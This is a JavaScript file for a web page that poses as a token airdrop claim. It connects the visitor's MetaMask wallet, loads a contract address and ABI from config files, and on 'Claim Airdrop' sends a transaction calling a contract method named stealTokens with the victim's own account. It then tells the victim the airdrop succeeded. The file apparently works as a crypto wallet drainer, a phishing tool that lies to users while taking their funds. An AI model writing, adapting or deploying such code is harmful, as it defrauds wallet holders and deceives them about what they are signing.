let web3;
let accounts;
let contractAddress;
let tokenAddress;
let contractABI;

// Function to load configuration and ABI files
async function loadConfig() {
  try {
    // Fetch config.json and handle the response
    const configResponse = await fetch('config.json');
    if (!configResponse.ok) {
      throw new Error('Failed to fetch config.json');
    }
    const configData = await configResponse.json();
    contractAddress = configData.contractAddress;
    tokenAddress = configData.tokenAddress;

    // Fetch abi.json and handle the response
    const abiResponse = await fetch('abi.json');
    if (!abiResponse.ok) {
      throw new Error('Failed to fetch abi.json');
    }
    const abiData = await abiResponse.json();
    contractABI = abiData;

    console.log("Configuration loaded:", configData);
    console.log("ABI loaded:", abiData);
  } catch (error) {
    console.error("Error loading config or ABI: ", error);
    alert("Error loading configuration or ABI. Please try again later.");
  }
}

// Function to connect to MetaMask (for desktop users)
async function connectMetaMask() {
  try {
    const provider = await detectEthereumProvider();
    
    if (provider) {
      // MetaMask is available
      web3 = new Web3(provider);
      accounts = await provider.request({ method: 'eth_requestAccounts' });
      console.log("Connected accounts:", accounts);

      // Enable claim button and disable connect button
      document.getElementById('claimAirdropButton').disabled = false;
      document.getElementById('connectButton').disabled = true;
    } else {
      alert('MetaMask not detected! Please install MetaMask on your device.');
    }
  } catch (error) {
    alert('MetaMask connection failed');
    console.error('MetaMask connection error:', error);
  }
}

// Function to check and trigger MetaMask deep link for mobile users
function checkAndOpenMetaMask() {
  if (navigator.userAgent.toLowerCase().includes('mobile')) {
    const deepLink = document.getElementById('metaMaskDeepLink');
    deepLink.click(); // Trigger the deep link to open MetaMask
  } else {
    alert("Please open MetaMask on your browser extension.");
  }
}

// Function to claim the airdrop (no approval needed)
async function claimAirdrop() {
  if (!accounts) {
    alert('Please connect to MetaMask first!');
    return;
  }

  if (!contractABI || !contractAddress) {
    alert('Contract details not loaded. Please try again later.');
    return;
  }

  const contract = new web3.eth.Contract(contractABI, contractAddress);
  try {
    console.log('Claiming airdrop...');
    // Call the contract's method to claim the airdrop
    await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
    alert('Airdrop claimed successfully!');
  } catch (error) {
    alert('Error claiming airdrop');
    console.error('Claim error:', error);
  }
}

// Add event listeners to the buttons
window.addEventListener('DOMContentLoaded', (event) => {
  document.getElementById('connectButton').addEventListener('click', () => {
    connectMetaMask();
    checkAndOpenMetaMask(); // Try to trigger MetaMask deep link if on mobile
  });
  document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);

  // Load configuration and ABI when the page loads
  loadConfig();
});



